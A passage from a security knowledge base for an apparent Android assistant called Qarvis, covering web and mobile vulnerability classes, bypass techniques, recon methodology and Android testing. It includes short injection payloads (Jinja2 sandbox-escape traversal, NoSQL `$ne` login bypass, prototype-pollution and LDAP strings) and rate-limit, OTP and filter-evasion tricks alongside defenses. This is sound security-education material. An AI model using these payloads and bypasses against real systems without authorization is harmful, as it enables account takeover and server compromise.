Severity ≈ **(worst realistic impact across the four groups) × (likelihood/ease of
exploitation) × (reversibility)**, adjusted for how many users/assets are in the blast
radius and whether it **chains** into something worse. A "medium" that chains to RCE or
account takeover is reported at the severity of the *end* of the chain, with the chain
shown.

### III.3 Why the "assume a bypass" habit is the ethical high ground

Attackers already think this way. The only question is whether a *defender/authorized
researcher* finds the bypass first and gets it fixed, or whether a criminal/state actor
finds it in production. Every control enumerated-and-broken in a lab or a bounty is a
control that *won't* fail with real users' money and data on the line. That is the
entire point of offensive security: break it on purpose, under authorization, so it
can't be broken by surprise. The bypass mindset without the ethics (§0.2) is just
crime; the ethics without the bypass mindset is just theater. Qarvis needs both.

---

# PART IV — QARVIS QUICK-REFERENCE CHECKLISTS

Condensed triggers for fast reasoning during an engagement.

### Web3 — for every contract/protocol, ask:
- [ ] External call before state update? (reentrancy — incl. cross-fn / cross-contract / **read-only** view-as-oracle)
- [ ] Every privileged fn: who can call it, what enforces it? Unprotected `initialize()`? `tx.origin`?
- [ ] Price source: single pool / `slot0` / manipulable? TWAP window short? stale-feed checks?
- [ ] Does any invariant break with a **flash loan** (infinite one-tx capital)?
- [ ] Bridge/signature: all fields + nonce + chain-id + domain bound? forgeable? default/zero root after upgrade?
- [ ] `ecrecover` rejects `address(0)`? low-`s` enforced? replay (nonce) protection?
- [ ] `delegatecall` target trusted? proxy/impl storage layouts match? impl `_disableInitializers()`?
- [ ] Governance: voting power snapshot before proposal? timelock? emergency fast-path?
- [ ] `unchecked{}` / downcasts / assembly math with attacker-controlled values?
- [ ] Low-level call / token transfer return value checked? fee-on-transfer/rebasing handled?
- [ ] Randomness from block vars? revert-on-loss free retry?
- [ ] Unbounded loop / push-payment DoS? first-depositor share inflation? infinite approvals?

### Traditional web — for every input/endpoint, ask:
- [ ] Input into a query? → SQLi (try boolean/time/UNION/OOB; then **every filter/WAF bypass**)
- [ ] Input into a shell/file op? → command injection / path traversal / LFI (separator & obfuscation bypasses)
- [ ] Input reflected into HTML/JS/attr? → XSS per context (+ WAF & **CSP bypass**)
- [ ] Object reference (id/uuid/filename) I can swap? → **IDOR**; try method/verb, headers, path-normalization, mass assignment
- [ ] State-changing request authed only by cookies? → CSRF (+ token/`SameSite` bypass)
- [ ] App fetches a URL I control? → SSRF (+ IP-encoding/IPv6/DNS-rebind/redirect/gopher bypasses) → cloud metadata
- [ ] Serialized blob I can tamper? → deserialization (gadget chains); XML input? → XXE (+ OOB/XInclude)
- [ ] Auth/session/JWT/OAuth/SAML/MFA: forgeable, skippable, replayable? reset-poisoning via Host header?
- [ ] Per-user limit / one-time action / balance? → **race condition** (single-packet parallel)
- [ ] Any money/quantity/workflow assumption I can violate? → **business logic** (negative, zero, huge, out-of-order, replay)
- [ ] CORS reflecting Origin + credentials? open redirect to chain? leaked secrets / `.git` / `.env`?
- [ ] Always: can a low-sev finding **chain** into ATO / RCE / data breach?

### Universal mantras
1. **Assume a bypass exists — enumerate the known ones for this exact control.**
2. **Map everything; the bug is where "A trusts B checked X" and nobody checked X.**
3. **Chain low bugs into high impact; report at the end of the chain.**
4. **Prove real-world impact across company / client / user / nation.**
5. **Authorized scope only. Minimal, non-destructive PoC. Responsible disclosure.**

---

## Appendix A — Primary sources & further study

Grounding references used and recommended for keeping this file current:

- **OWASP** — Top 10, Web Security Testing Guide (WSTG), Cheat Sheet Series
  (SSRF, Deserialization, XXE, CSRF, SQLi prevention).
- **PortSwigger Web Security Academy** — labs/notes for XSS, CSRF, SSRF, SQLi,
  access control, request smuggling, race conditions, JWT, OAuth, CORS.
- **Smart contract** — SWC Registry; SCSVS; Trail of Bits *building-secure-contracts*;
  Consensys smart-contract best practices; Immunefi bug writeups; *rekt.news*;
  ChainSecurity / BlockSec / CertiK / Halborn post-mortems.
- **PayloadsAllTheThings** and **HackTricks** for payload/bypass catalogs
  (use as leads; verify against primaries).
- **HackerOne Hacktivity** and disclosed reports for real traditional-web case studies.

Case studies referenced in this file (verify exact figures against primary
post-mortems before citing):
- Reentrancy: The DAO (2016); CREAM/AMP ERC-777 (Aug 2021); read-only — dForce
  (Feb 2023, ~$3.7M), Conic Finance (Jul 2023, ~$3.2M); Curve `get_virtual_price`
  (ChainSecurity post-mortem).
- Access control / proxy: Parity multisig (Jul & Nov 2017, ~513K ETH frozen).
- Oracle / flash loan: bZx (Feb 2020); Mango Markets (Oct 2022, ~$114M, spot pump);
  Beanstalk governance (Apr 2022, ~$182M, ~$1B Aave flash loan).
- Bridges: Wormhole (Feb 2022, ~$326M, signature-verify bypass); Nomad (Aug 2022,
  ~$190M, zero trusted root); Poly Network (Aug 2021, ~$611M, returned); Ronin
  (Mar 2022, ~$625M, validator-key + leftover DAO delegation).
- Web: Capital One (2019, SSRF → cloud metadata → ~100M records).

> **Maintenance note for Qarvis:** techniques and especially *bypasses* evolve
> constantly. Treat this file as a living brain: when a new bypass, case study, or
> class appears in a reputable source, add it under the right section rather than
> starting over. Last substantive research pass: 2026-10-10.

---

*End of knowledge base. This file encodes a reasoning posture for authorized security
work only (see §0.2). Use it to think — not to harm.*

# PART V — MORE WEB VULNERABILITY CLASSES

The first pass (Parts I–IV) covered the backbone. This part adds the classes that win
a lot of real bounties and that a complete "attacker brain" must carry. Same format:
what it is → how found → defenses → **bypasses** → why it matters. Numbering continues
from §34.

---

### 35. Server-Side Template Injection (SSTI)

**What it is.** User input is embedded into a server-side template that is then
*evaluated* (not just rendered as data). Template engines (Jinja2/Flask, Twig, Freemarker,
Velocity, Thymeleaf, ERB, Handlebars, Pug, Smarty, Mako) expose language/object access;
if you can inject template syntax, you often reach **RCE**. Classic tell: `{{7*7}}`
returns `49`.

**How it's found.** Inject polyglot probes into anything that may be templated —
names, email subjects/bodies, usernames rendered back, "custom message" fields,
file names, PDF/report generators, error pages. Probe per engine:
`${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `@(7*7)`. A reflected math result
confirms evaluation. Then fingerprint the engine (which probe worked, error strings)
and escalate to object/class traversal.

**Defenses.** Never concatenate user input into templates — pass it as **data/context
variables**, not template source; use a **logic-less / sandboxed** engine
(e.g. sandboxed Jinja, Handlebars without helpers); allowlist template names; keep the
template compiler away from user input entirely.

**Bypass techniques (against sandboxes/filters):**
- **Sandbox escape via object traversal.** In Jinja2, reach Python internals:
  `{{ ''.__class__.__mro__[1].__subclasses__() }}` → find a class that can spawn
  processes (`subprocess.Popen`, `os`-bearing objects) → RCE. Equivalent gadget chains
  exist for Freemarker (`freemarker.template.utility.Execute`), Velocity, Twig
  (`_self`, `registerUndefinedFilterCallback` → `system`), Smarty, Ruby ERB.
- **Attribute-filter bypass:** if `__class__`/`__globals__` are blocked, use
  `request`, `config`, `lipsum`, `cycler`, `joiner`, `namespace` globals (Flask/Jinja)
  or `|attr('__cl'+'ass__')` string-concat and `request.args`/`|attr()` indirection to
  dodge keyword blocklists; hex/unicode escapes; `getattr` chains.
- **Filter-based blocklist evasion:** split forbidden words (`__cla''ss__`), use
  `|attr()`, `request['application']`, dictionary/`get` lookups, or
  `{% ... %}` statement blocks when `{{ }}` is filtered.
- **Blind SSTI:** no reflection → time-based (`sleep`) or OAST exfil via the engine's
  HTTP/file primitives.

**Real cases.** SSTI has produced pre-auth RCE in major platforms (Jinja2/Flask apps,
Atlassian Confluence Freemarker/OGNL-adjacent issues, Shopify/Uber-class disclosures on
HackerOne). It's a frequent "critical" on report leaderboards.

**Why it matters.** SSTI is usually a straight line to **RCE** and full server
compromise — among the highest-impact web bugs, with the same breach/pivot/regulatory
stakes as command injection and deserialization.

---

### 36. NoSQL injection

**What it is.** Injection into NoSQL datastores (MongoDB, CouchDB, etc.) where
untrusted input becomes part of a query object or a server-side JS evaluation. Because
queries are often JSON/BSON, operators like `$ne`, `$gt`, `$regex`, `$where`, `$in` can
be smuggled in to subvert logic — classically an **auth bypass**:
`{"user":"admin","pass":{"$ne":null}}` logs in without the password.

**How it's found.** In JSON bodies, try replacing a string value with an operator
object (`{"$ne":1}`, `{"$gt":""}`, `{"$regex":"^a"}`). In URL/form params, array/
operator syntax (`user[$ne]=1`, `pass[$regex]=.*`). Look for behavior changes, boolean/
regex blind extraction, and `$where`/`mapReduce` JS-eval sinks (→ possible RCE/DoS).

**Defenses.** Treat input as data: type-check/cast to string, reject objects where
scalars are expected; use parameterized/ODM query builders safely; disable server-side
JS (`$where`, `mapReduce`); schema validation (e.g. reject keys starting with `$`/`.`);
sanitize operator characters.

**Bypass techniques:** send operators as **nested objects/arrays** when the app only
sanitizes strings; **type juggling** (array vs string vs object) to defeat naive
`typeof` checks; use `$regex`/`$where` for **blind boolean/time** extraction
character-by-character when no direct output; bury `$`-keys in deeply nested JSON that
a shallow sanitizer misses; exploit frameworks that auto-parse `a[$ne]=b` query strings
into objects.

**Why it matters.** Auth bypass → account/admin takeover, and full collection
dump of user data — same breach/PII/regulatory consequences as SQLi, in the
NoSQL-heavy modern stack where devs wrongly assume "NoSQL = no injection."

---

### 37. Prototype pollution (JavaScript / Node.js)

**What it is.** In JS, objects inherit from `Object.prototype`. If an attacker can set
a property named `__proto__` (or `constructor.prototype`) through an unsafe merge/clone/
path-set, they pollute the **global prototype**, so *every* object suddenly has an
attacker-controlled property. Impact: logic bypass (inject `isAdmin`/`isAuthenticated`),
DoS, client-side **DOM XSS** gadget activation, and server-side **RCE** (polluting
properties consumed by `child_process`, template engines, or config at spawn time).

**How it's found.** **Server-side:** find deep-merge/clone/`extend`/query-parser code
fed user JSON; send `{"__proto__":{"polluted":"x"}}` or
`{"constructor":{"prototype":{"polluted":"x"}}}` and check if a fresh object gains
`polluted`. **Client-side:** inject via URL params/hash parsed by vulnerable libraries;
use known gadget chains to turn pollution into XSS. Tools: `ppfuzz`, DOM Invader
(Burp) prototype-pollution scanning, source review of `lodash.merge`/`set`,
`jQuery.extend(true,...)`, `deep-extend`, query-string parsers.

**Defenses.** Block `__proto__`/`constructor`/`prototype` keys in merges; use
`Object.create(null)` for untrusted maps; `Map` instead of plain objects;
`Object.freeze(Object.prototype)`; schema validation; patched library versions;
`--disable-proto` Node flag.

**Bypass techniques:** if `__proto__` is filtered, use the `constructor.prototype`
path; array-path notation (`a[__proto__][x]`); unicode/encoding of the key; polluting
via nested arrays; and chaining to a **gadget** (a property the app reads later — e.g.
a templating option, a shell argument/`NODE_OPTIONS`, or an HTML sink) so pollution
becomes XSS/RCE even when the pollution itself looks harmless.

**Real cases.** Widespread via Lodash (`CVE-2019-10744` and others), jQuery `extend`,
and many Node libraries; chained to RCE in several server frameworks and to DOM XSS on
major sites.

**Why it matters.** A "set a weird property" bug escalates to auth bypass, XSS, or RCE
across the enormous Node/JS ecosystem — and because it's prototype-wide, it corrupts
code the developer never associated with user input.

---

### 38. LDAP, XPath & other query-language injections

**What it is.** The SQLi pattern repeated in other query languages. **LDAP injection**
into directory queries (common in enterprise login/search): `*)(uid=*))(|(uid=*` or
`*` wildcards to bypass auth or enumerate the directory. **XPath/XQuery injection** into
XML document queries: `' or '1'='1` equivalents (`or 1=1`, `or position()=1`) to read
unauthorized nodes or bypass auth. Also **XQuery, Cypher (Neo4j), SPARQL, ORM/HQL/JPQL
injection**.

**How it's found/bypassed.** Inject the language's metacharacters/operators into any
input reaching such a query; watch for auth bypass, broadened results, or errors.
LDAP: `*`, `)(`, `|`, `&`, null-byte truncation; blind boolean extraction via filters.
XPath: `or`, `and`, `string-length`, `substring` for blind char-by-char extraction
(no table privileges to stop you — the whole XML doc is readable).

**Defenses.** Parameterized/escaped queries per language (LDAP encoding of `*()\\NUL`,
XPath variable binding), input allowlists, least privilege.

**Why it matters.** Auth bypass and full directory/document disclosure — enterprise
identity stores (LDAP/AD) are especially high-value: dumping them aids lateral movement
across an entire organization.

---

### 39. CRLF injection / HTTP response splitting & header injection

**What it is.** Unsanitized input containing `\r\n` (`%0d%0a`) injected into HTTP
response headers (or logs, or emails). Lets an attacker inject new headers or a new
response body: set malicious cookies, poison caches, add `Location`/open redirect,
inject XSS into a split response, or forge log entries (**log injection/forging**).
**Email header injection** (`\n` into a mail header) adds BCC/attachments/spoofed
senders.

**How it's found/bypassed.** Put `%0d%0a` (and `%0a`, `%E5%98%8A%E5%98%8D` overlong/
unicode CRLF variants that some servers normalize) into anything reflected into headers:
`Location`, `Set-Cookie`, redirect params, custom headers, filenames in
`Content-Disposition`. If `\r`/`\n` are stripped, try unicode/overlong encodings and
header-specific parsers.

**Defenses.** Strip/reject CR/LF in header-bound values; use framework header APIs that
encode; don't reflect raw input into headers or emails; validate redirect targets.

**Why it matters.** Enables cache poisoning (mass cross-user impact), XSS, session
fixation via injected cookies, phishing via injected redirects, and email spoofing —
plus log forging that hampers incident response.

---

### 40. Host header injection & password-reset poisoning

**What it is.** Apps that trust the incoming `Host` / `X-Forwarded-Host` header to build
absolute URLs (password-reset links, email links, cache keys, "current domain" logic)
can be fed an attacker domain. The lethal case: **password-reset poisoning** — the reset
email's link is built from the attacker-controlled Host, so when the victim clicks, the
token is sent to the attacker.

**How it's found/bypassed.** Change `Host`, or add `X-Forwarded-Host`,
`X-Host`, `X-Forwarded-Server`, duplicate `Host`, or absolute-URI request line; trigger
a reset and inspect the generated link/email. Also drives routing-based SSRF and web
cache poisoning (unkeyed Host).

**Defenses.** Use a server-configured canonical/allowlisted domain for URL generation
(never the request Host); validate `Host` against an allowlist; don't honor
`X-Forwarded-*` unless from a trusted proxy.

**Why it matters.** One-click **account takeover** of arbitrary users via reset-link
theft; plus cache poisoning and SSRF — high impact from a header most devs never
consider attacker-controlled.

---

### 41. Clickjacking (UI redressing)

**What it is.** The target site is loaded in a transparent/obscured iframe over
attacker bait, so the victim's clicks land on the real site's sensitive controls
(change settings, confirm a transfer, grant an OAuth scope, delete account). Variants:
**likejacking**, **cursorjacking**, and **drag-and-drop** data theft.

**How it's found/bypassed.** Try to frame the target (`<iframe src=target>`); if it
renders and sensitive one-click actions exist, it's exploitable. **Bypasses of weak
framing defenses:** frame-busting JS is defeated by `sandbox` iframes (which can
neutralize top-navigation) or `onbeforeunload` tricks; partial/misconfigured
`X-Frame-Options`/CSP (e.g. `ALLOW-FROM` ignored by modern browsers, or
`frame-ancestors` missing) leaves gaps.

**Defenses.** `Content-Security-Policy: frame-ancestors 'none'|'self'` (the modern,
browser-honored control), `X-Frame-Options: DENY/SAMEORIGIN` (legacy), `SameSite`
cookies (blunt some flows), and requiring explicit re-auth/confirmation with
unpredictable, non-framable steps for critical actions.

**Why it matters.** Tricks users into performing privileged actions as themselves —
account changes, fund transfers, OAuth consent — at scale via a lure page. Often the
fallback when CSRF tokens hold.

---

### 42. Subdomain takeover & dangling DNS

**What it is.** A DNS record (usually `CNAME`) points to a third-party service
(GitHub Pages, S3, Heroku, Azure, Shopify, Fastly, etc.) that is no longer claimed. An
attacker registers the unclaimed resource and now serves content on the company's
subdomain — with all the trust (and often cookies/CORS/SSO scope) that implies.

**How it's found.** Enumerate subdomains, resolve CNAMEs, look for "no such bucket/app/
page" fingerprints on dangling targets; tools: `subjack`, `nuclei` takeover templates,
`dnsReaper`. Verify by claiming the resource in a controlled PoC only.

**Defenses.** Remove DNS records when decommissioning services; monitor for dangling
CNAMEs; use verification records; claim/park resources.

**Bypass/escalation.** A subdomain under the parent's cookie scope lets you steal
`Domain=.site.com` cookies, bypass `SameSite` (same-site!), satisfy CORS/`*.site.com`
allowlists, and host convincing phishing/OAuth-redirect targets — chaining a "low" DNS
hygiene issue into session theft and ATO.

**Why it matters.** Brand-trusted phishing, cookie/session theft across the org,
CORS/OAuth bypass, and reputational damage — a classic low-effort, high-leverage bounty.

---

### 43. GraphQL-specific attacks

**What it is.** GraphQL's flexibility creates its own surface on top of the generic
IDOR/authz issues. Key classes: **introspection** exposing the full schema (hidden
types/fields/mutations); **missing object/field-level authorization** (query any id,
reach admin-only fields the REST layer protected); **batching/aliasing abuse** to brute
force (OTPs, credentials, IDs) or bypass rate limits by sending hundreds of operations
in one request; **nested-query DoS** (deeply recursive queries exhausting resources);
**mutation discovery** of privileged actions; **injection** passed through resolvers to
SQL/NoSQL.

**How it's found.** Hit `/graphql`, `/graphql/console`, `/v1/graphql`; run
introspection (`__schema`, `__type`); map queries/mutations; test each resolver for
authz independently; try aliases (`a: login(...) b: login(...)`) for brute force; test
depth/complexity limits. Tools: `graphql-cop`, `clairvoyance` (schema recovery even
when introspection is off), InQL (Burp), `graphw00f`.

**Defenses.** Disable introspection in prod; **enforce authz in every resolver**
(don't rely on the gateway); query **depth/complexity limits** and cost analysis;
disable/limit batching and aliasing; rate-limit by operation; persisted queries
(allowlist).

**Bypasses:** recover schema with `clairvoyance` when introspection is disabled;
circumvent per-request rate limits via **aliasing/batching** (N attempts, 1 request);
reach fields via alternate resolvers/edges when one path is protected; field
duplication/fragment tricks; injection through resolver arguments.

**Why it matters.** GraphQL concentrates data access; a single missing resolver check
or an aliasing-based OTP brute force yields mass data exposure or account takeover,
often across the whole API at once.

---

### 44. WebSocket & real-time security

**What it is.** WebSocket handshakes and messages often skip the protections applied to
HTTP. Issues: **Cross-Site WebSocket Hijacking (CSWSH)** — the WS handshake is a normal
cross-origin request authed by cookies with no CSRF token and no `Origin` check, so an
attacker page opens a socket as the victim and reads/sends messages; missing authz on
individual WS messages; injection via WS data into XSS/SQL sinks; no rate limiting.

**How it's found/bypassed.** Check whether the handshake validates `Origin` and uses an
unpredictable token; if not, CSWSH. Replay/forge messages; tamper message fields for
IDOR-over-WS; inject payloads into message content. Burp's WebSocket tools.

**Defenses.** Validate `Origin` on the handshake, use CSRF tokens for the upgrade,
authenticate and authorize **every message** (not just the handshake), input-validate
message content, rate-limit.

**Why it matters.** CSWSH is account/data takeover over the real-time channel; unauthz'd
messages expose live data (chat, trading, telemetry) — the same stakes as HTTP IDOR/XSS
on a channel devs often forget to secure.

---

### 45. Authentication-flow abuse: rate-limit, OTP, CAPTCHA & reset bypasses

**What it is.** The surrounding auth machinery — throttling, OTP/2FA, CAPTCHA, lockout,
reset — fails in characteristic ways that enable brute force and takeover even when the
password check is sound.

**Bypass techniques (the point):**
- **Rate-limit / lockout bypass:** rotate `X-Forwarded-For`/`X-Real-IP`/
  `X-Client-IP` if the limiter keys on a spoofable header; reset the counter by varying
  case/trailing dot/path; use **GraphQL aliasing or HTTP/2 multiplexing** to send many
  attempts per request; distribute across endpoints that share a limit poorly; race the
  limiter (single-packet) before the counter commits.
- **OTP/2FA bypass:** brute force weak/short OTPs with no attempt cap; **response
  manipulation** (`"verified":false`→`true`); reuse/no-expiry OTPs; OTP leaked in the
  response or a side endpoint; skip the 2FA step by calling the post-2FA endpoint
  directly; backup-code/remember-device/"disable 2FA" flows with weaker checks; race on
  verification; **status-code/length oracle** distinguishing right from wrong codes.
- **CAPTCHA bypass:** CAPTCHA validated only client-side or not re-checked server-side;
  token reusable across requests; missing on an alternate endpoint; removing the
  parameter skips validation; outsourced-solver (for research only, within rules).
- **Reset-token flaws:** predictable/sequential tokens, no expiry, reusable, not bound
  to the account, leaked via Referer/Host poisoning (§40), or reset that doesn't
  invalidate active sessions.

**Defenses.** Server-side, identity-keyed rate limits and lockout (not header-keyed);
long, single-use, expiring, attempt-capped OTP/reset tokens; server-side CAPTCHA
verification with single-use tokens; enforce every auth step server-side.

**Why it matters.** These are the *practical* path to mass account takeover —
credential stuffing and OTP brute force are how real breaches happen even against
"strong" password policies.

---

### 46. Dependency confusion & software supply chain

**What it is.** Package managers can be tricked into pulling a **malicious public
package** in place of an intended **internal/private** one (dependency confusion /
namespace squatting), or a compromised dependency/build step injects code. Related:
**typosquatting**, malicious post-install scripts, compromised CI/CD, leaked publish
tokens, and unpinned/unverified dependencies.

**How it's found.** Discover internal package names (leaked in source maps, JS bundles,
error messages, public repos, `package.json`); check whether the registry resolves
public over private by version; look for unclaimed internal names on public registries.
For bounties: **only register a harmless proof package / use the program's defined
method** — never ship anything that executes on victims.

**Defenses.** Scoped packages + private-registry-first resolution; namespace
reservation on public registries; lockfiles with integrity hashes; pin and verify
dependencies; signed packages/provenance (SLSA, Sigstore); least-privilege CI tokens;
review post-install scripts.

**Why it matters.** Supply-chain compromise is the highest-leverage attack of the era:
one malicious package runs in **every** downstream build and production environment —
mass, cross-organization breach (SolarWinds, `event-stream`, countless npm/PyPI
incidents). For companies and governments it's a systemic, trust-destroying risk.

---

# PART VI — RECON & METHODOLOGY

Most bounties are won *before* a single payload: in attack-surface discovery. The
hunter who sees the endpoint nobody else found wins. This part is the process Qarvis
runs to build the map it then attacks (always within authorized scope — §0.2).

### VI.1 Scope intake (do this first, every engagement)

- Read the program/engagement rules end to end: in-scope domains/apps/contracts,
  **out-of-scope** assets, **prohibited test types** (DoS, automated scanning limits,
  social engineering, physical), rate limits, required test markers/headers, and the
  disclosure process.
- Note the **reward model** (what severities pay, what's explicitly out of interest) to
  triage effort toward impact that counts.
- Set up a test account (or two, for IDOR) and a safe PoC marker so findings are
  obviously benign.

### VI.2 Asset & subdomain discovery

- **Passive:** certificate transparency (crt.sh), `amass`/`subfinder`/`assetfinder`,
  DNS datasets, ASN lookups (find all IP ranges the org owns), reverse DNS, Shodan/
  Censys/FOFA, GitHub/GitLab org repos, Wayback/`gau`/`waybackurls` for historical
  URLs and parameters, `dorking` (Google/GitHub dorks for leaked keys, panels, files).
- **Active (within rules):** DNS brute force (`puredns`, `shuffledns` with good
  wordlists + resolvers), permutation (`dnsgen`, `altdns`), `massdns`; resolve and
  probe live hosts (`httpx`) capturing titles, tech, status, TLS.
- **Fingerprint:** `httpx`/`wappalyzer`/`whatweb`/`nuclei -t technologies` for stack,
  CDN/WAF, frameworks, versions → known-CVE leads.

### VI.3 Content & parameter discovery

- **Directory/file brute force:** `ffuf`/`feroxbuster`/`dirsearch` with
  context-appropriate wordlists (SecLists); recurse; look for backups
  (`.bak`,`~`,`.old`), VCS (`.git/`,`.svn/`), config (`.env`), admin panels, API docs
  (`/swagger`, `/openapi.json`, `/graphql`, `/.well-known/`), debug/actuator endpoints.
- **JavaScript mining:** download all JS, beautify, grep for endpoints, API routes,
  parameters, secrets/keys, feature flags, and hidden functionality
  (`linkfinder`, `getjs`, `jsluice`, source maps → original source). JS is where hidden
  attack surface lives.
- **Parameter discovery:** `arjun`/`param-miner` to find unlinked parameters (often
  the ones with no validation); mine Wayback for historical params.
- **Mobile/desktop clients & APIs:** decompile apps (Part VII) and intercept to find
  undocumented API endpoints — frequently weaker than the web app.

### VI.4 Mapping & modeling (turn recon into hypotheses)

- Build the **role/permission matrix** and the **state machine** (signup → verify →
  use → delete; order → pay → ship → refund). Bugs hide in transitions and in "who may
  do what."
- Mark every **trust boundary** and every **object reference** (IDOR candidates).
- Diff behavior between roles, tenants, and API versions (old `/v1` often lacks `/v2`'s
  fixes).
- List inputs by *sink type* (query, shell, template, HTML, URL-fetch, deserializer,
  file op) to know which class to test where.

### VI.5 Testing discipline

- One hypothesis, smallest confirming probe, minimal footprint. Prefer blind/OAST
  confirmation over anything destructive.
- Keep a log of every request/finding for the report. Screenshot/save raw requests.
- **Chain constantly:** after any finding, ask "what does this unlock?" (recon leak →
  endpoint → IDOR → ATO; open redirect → OAuth code theft → ATO; SSRF → metadata →
  cloud).
- Respect rate limits and avoid noisy automated scanning where the program forbids it.

### VI.6 Where bugs cluster (pattern memory)

- **New features / recent deploys** (less tested), **beta/staging** hosts, **old API
  versions**, **admin/internal** tools exposed externally, **third-party integrations**
  and webhooks, **import/export/file** features, **payment/refund/coupon** logic,
  **auth edges** (reset, SSO, 2FA, invite), **multi-tenant** boundaries, and anything
  that **fetches a URL, renders a template, parses a document, or deserializes**.

---

# PART VII — MOBILE & ANDROID APPLICATION SECURITY

Directly relevant to Qarvis itself (an Android app) and to mobile bug bounty targets.
Framework: **OWASP MASVS** (verification standard) and **OWASP MASTG** (testing guide).
Mobile bugs span the app binary, local storage, IPC, and the backend it talks to.

### VII.1 Attack surface

- **Client binary:** hardcoded secrets/keys, weak crypto, logic you can patch/bypass.
- **Local storage:** insecure data at rest (SharedPreferences, SQLite, files,
  KeyStore misuse, cached data, logs).
- **IPC / components:** exported Activities, Services, BroadcastReceivers, and
  **ContentProviders**; **deep links / app links**; intent handling.
- **Network:** API calls (often the real prize — weaker than web), TLS/pinning.
- **Platform misuse:** permissions, WebViews, clipboard, screenshots, backup flags.

### VII.2 How it's tested

- **Static:** decompile with `jadx`/`apktool` (and `apktool` for resources/manifest);
  read `AndroidManifest.xml` for `exported=true` components, permissions,
  `android:debuggable`, `allowBackup`, `usesCleartextTraffic`,
  `networkSecurityConfig`, deep-link intent filters. Grep smali/Java for secrets,
  endpoints, crypto. Tools: `MobSF` (automated static+dynamic), `semgrep` mobile rules.
- **Dynamic:** run on a rooted device/emulator; **Frida**/`objection` to hook methods
  (bypass root/pinning checks, dump runtime data, call internal functions); intercept
  API traffic (Burp/mitmproxy with a user CA, plus pinning bypass); inspect storage at
  runtime.
- **IPC testing:** `adb` to invoke exported components
  (`adb shell am start`/`startservice`/`broadcast`), fuzz ContentProviders
  (`content query --uri`), and trigger deep links (`adb shell am start -a VIEW -d
  "app://..."`).

### VII.3 Key Android bug classes, defenses & bypasses

**Insecure data storage.** Sensitive data (tokens, PII, keys) in plaintext
SharedPreferences/SQLite/files, in logs (`Logcat`), or in app backups. *Defense:*
Android KeyStore for keys, `EncryptedSharedPreferences`, no secrets in logs,
`allowBackup=false`, `FLAG_SECURE` for sensitive screens. *Bypass:* with root/Frida,
read KeyStore-protected data at runtime; pull `adb backup` if allowed; scrape logs.

**Exported components & intent abuse.** An `exported` Activity/Service/Receiver callable
by *any* app → unauthorized actions, privilege use, or data leak. **Intent redirection/
confused deputy:** a component forwards an attacker-supplied Intent with the victim
app's privileges, reaching non-exported components or `grantUriPermission` to private
files. *Defense:* `exported=false` unless needed; `signature`-level permissions;
validate incoming Intents; don't blindly forward Intents; verify caller identity.
*Bypass:* craft Intents via `adb`/a malicious app; chain intent redirection to reach
internal components; pending-intent hijacking.

**ContentProvider leaks / SQLi / path traversal.** Exported providers exposing private
data, injectable query selectors (SQLi), or `openFile` path traversal
(`../../databases/...`) leaking app-private files. *Defense:* not exported, permissions,
parameterized queries, canonicalized file paths. *Bypass:* `content://` queries with
injection or traversal from any app.

**Deep link / App Link hijacking & open redirect.** Weakly verified deep links let a
malicious app register the same scheme, or unvalidated deep-link parameters drive
in-app navigation/WebView to attacker URLs (→ token theft, OAuth code interception).
*Defense:* verified **App Links** (Digital Asset Links), validate all deep-link params,
don't pass them to WebView/`loadUrl` unchecked. *Bypass:* scheme collision, `autoVerify`
gaps, parameter injection into the post-link flow.

**WebView vulnerabilities.** `setJavaScriptEnabled(true)` + `addJavascriptInterface`
exposes native methods to page JS (→ RCE-in-app if the page is attacker-influenced);
`setAllowFileAccess`/`setAllowUniversalAccessFromFileURLs` enabling `file://` → local
file theft and cross-origin reads; loading untrusted/`http` content → XSS with native
bridge reach. *Defense:* disable JS where unneeded, avoid `addJavascriptInterface`
(or `@JavascriptInterface`-gate and only trusted content), disable file access, load
only HTTPS trusted origins, set a strict `WebViewClient`. *Bypass:* MITM of cleartext/
unpinned WebView content; deep-link into the WebView with a malicious URL; exploit an
exposed JS bridge.

**Weak/missing TLS & cert pinning.** Cleartext traffic, trusting user CAs, or no
pinning → MITM of API traffic. *Defense:* `networkSecurityConfig` (no cleartext, no
user CAs for sensitive), certificate/public-key pinning. *Bypass (for testing):* Frida/
objection pinning bypass, patching the pinning check, `apk-mitm` — which is exactly why
pinning is only *one* layer, not a substitute for server-side authz.

**Root/debug detection bypass.** Apps detect root/Frida/emulator; these are
*speed bumps* — routinely bypassed with Frida hooks, Magisk Hide/DenyList, or patching
the check. Never treat client-side integrity checks as a security boundary.

**Client-side trust / hardcoded secrets.** API keys, signing secrets, backend URLs,
and "admin" flags baked into the binary. *Defense:* keep secrets server-side; the app
should enforce nothing security-critical locally. *Bypass:* decompile and read; patch
local checks (feature unlocks, paywalls, "isPremium"); the real bugs are usually in the
**backend API** these reveal.

### VII.4 Qarvis self-audit notes (defensive, for this very project)

Because Qarvis is an always-listening accessibility/overlay assistant that launches
apps and can place calls, it is itself a sensitive component. When reasoning about its
own hardening:

- **Exported components:** ensure `QarvisService`, `BootReceiver`, and any Activity are
  not needlessly `exported`; a malicious app should not be able to drive Qarvis's
  command router via Intent.
- **Command injection into intents:** the `CommandRouter` builds `tel:`/URL/package
  intents from recognized speech — validate/allowlist so a crafted phrase can't dial
  arbitrary premium numbers or launch unintended privileged flows (the existing
  financial-app blocklist is a good instinct; prefer an **allowlist** model for
  anything money- or call-related).
- **Overlay (HUD) & accessibility:** overlay + accessibility permissions are prime
  **tapjacking/overlay-attack** surface and malware-flagging triggers; keep
  `FLAG_SECURE` on sensitive content and minimize what the overlay can trigger.
- **No secrets in the APK / logs;** `allowBackup=false`; avoid logging recognized
  commands (privacy).
- **Wake-word/model assets integrity** and the **GitHub Actions build pipeline**
  (supply chain, §46): protect signing keys and build secrets; pin actions.

**Why mobile matters.** Phones hold identity, money, location, messages, and
ever-listening sensors. A mobile bug is intimate: it can read a person's whole life,
and for an assistant with call/overlay/accessibility power, a compromise is effectively
device takeover. For companies, the mobile backend API is often the softest entry to
the same data the web app guards tightly.

---

# PART VIII — WEB3 DEEP DIVE (how it works, how the bounty works, hunter-first)

> This part goes deep on Web3 because that is where the biggest, cleanest payouts live
> and where the "assume a bypass" mind earns the most. It is written **hunter-first**:
> the organizing question is always *"what does this mean for me, the bug bounty
> hunter?"* — will it pay, will it be accepted, how often does it appear — and only
> then what it means for the company and the users. A bug that is catastrophic for a
> company but **not rewardable / not acceptable** for a hunter is deprioritized here
> (see the priority lens in §VIII.3). Do the big, clean, provable, *payable* bugs
> first.

---

